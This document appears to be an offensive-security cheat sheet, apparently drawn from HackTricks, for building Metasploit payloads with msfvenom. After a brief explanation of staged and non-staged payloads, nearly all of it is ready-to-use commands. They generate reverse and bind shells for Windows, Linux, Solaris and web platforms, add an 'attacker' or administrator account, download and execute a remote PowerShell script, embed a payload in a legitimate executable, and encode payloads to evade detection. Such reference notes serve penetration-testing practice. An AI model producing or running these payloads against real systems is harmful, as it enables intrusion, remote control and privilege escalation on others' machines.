
### **MSF provides 2 types of payloads can be paired with an exploit:** 

##### **1. <mark style="background: #239b56;">Non-Staged Payload:</mark> **
Payload that is sent to the target system as is along with the exploit

##### **2. <mark style="background: #e74c3c;">Staged Payload:</mark> **
A Staged payload is sent to the target in two parts, whereby:

The first part (<mark style="background: #00CDFF82;">**Stager**</mark>) contains a payload that is used to establish a reverse connection back to the attacker (Just for downloading something),  
download the second part of the payload (<mark style="background: #e74c3c;">**Stage**</mark>) and execute it Which could be Arbitrary commands or a Reverse Shell.

> **<mark style="background: #00CDFF82;">Stager:</mark>** is typically used to establish a stable communication channel between the attacker and target, after which a stage payload is downloaded and executed on the target system.

><mark style="background: #e74c3c;">**Stage:**</mark> Payload components that are downloaded by the stager.


---

# **Windows**

### [**Reverse Shell**](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/msfvenom.html#reverse-shell)



`msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe`

### [Bind Shell](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/msfvenom.html#bind-shell)



`msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe`

### [Create User](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/msfvenom.html#create-user)



`msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe`

### [CMD Shell](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/msfvenom.html#cmd-shell)



`msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe`

### [**Execute Command**](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/msfvenom.html#execute-command)



`msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe`

### [Encoder](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/msfvenom.html#encoder)



`msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe`

### [Embedded inside executable](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/msfvenom.html#embedded-inside-executable)



`msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe`

# **Linux Payloads**

### [Reverse Shell](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/msfvenom.html#reverse-shell-1)



`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf`

### [Bind Shell](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/msfvenom.html#bind-shell-1)



`msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf`

### [SunOS (Solaris)](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/msfvenom.html#sunos-solaris)



`msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf`




# **Web Based Payloads**
### [**PHP**](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/msfvenom.html#php)

#### [Reverse shel**l**](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/msfvenom.html#reverse-shell-3)



`msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php`

### [ASP/x](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/msfvenom.html#aspx)

#### [Reverse shell](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/msfvenom.html#reverse-shell-4)

bash

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx`

### [JSP](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/msfvenom.html#jsp)

#### [Reverse shell](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/msfvenom.html#reverse-shell-5)

bash

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp`

### [WAR](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/msfvenom.html#war)

#### [Reverse Shell](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/msfvenom.html#reverse-shell-6)

bash

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war`

### [NodeJS](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/msfvenom.html#nodejs)

bash

`msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)`


---

# **Script Language payloads**


### [**Perl**](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/msfvenom.html#perl)

bash

`msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl`

### [**Python**](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/msfvenom.html#python)

bash

`msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py`

### [**Bash**](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/msfvenom.html#bash)

bash

`msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh`